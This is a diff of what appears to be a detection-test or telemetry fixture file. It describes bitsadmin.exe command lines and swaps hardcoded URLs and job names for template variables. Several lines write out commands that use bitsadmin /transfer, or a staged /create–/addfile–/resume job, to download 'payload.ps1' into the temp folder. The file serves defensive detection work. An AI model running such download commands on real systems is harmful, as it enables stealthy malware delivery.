@@ -26,11 +26,11 @@ state:
 
   # direct download: /transfer fetches the remote file in one command
   transfer_command_line:  "bitsadmin.exe  /transfer /Download /priority Foreground ${ref.payload_url} ${ref.temp_dir}\\payload.ps1"
-  transfer_parent:        '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /transfer /Download /priority Foreground https://downloads.example.net/pkg/payload.ps1 %temp%\payload.ps1"'
+  transfer_parent:        '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /transfer /Download /priority Foreground ${ref.payload_url} %temp%\payload.ps1"'
 
   # staged download: /addfile attaches a download URL to a created job
   addfile_command_line:   "bitsadmin.exe  /addfile ${ref.bits_job} ${ref.payload_url} ${ref.temp_dir}\\payload.ps1"
-  addfile_parent:         '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /create UpdateJob & bitsadmin.exe /addfile UpdateJob https://downloads.example.net/pkg/payload.ps1 %temp%\payload.ps1 & bitsadmin.exe /resume UpdateJob & timeout 5 & bitsadmin.exe /complete UpdateJob"'
+  addfile_parent:         '"C:\Windows\system32\cmd.exe" /c "bitsadmin.exe /create ${ref.bits_job} & bitsadmin.exe /addfile ${ref.bits_job} ${ref.payload_url} %temp%\payload.ps1 & bitsadmin.exe /resume ${ref.bits_job} & timeout 5 & bitsadmin.exe /complete ${ref.bits_job}"'
 
   # enumeration only: /list downloads nothing
   list_command_line:      "bitsadmin.exe  /list /allusers /verbose"
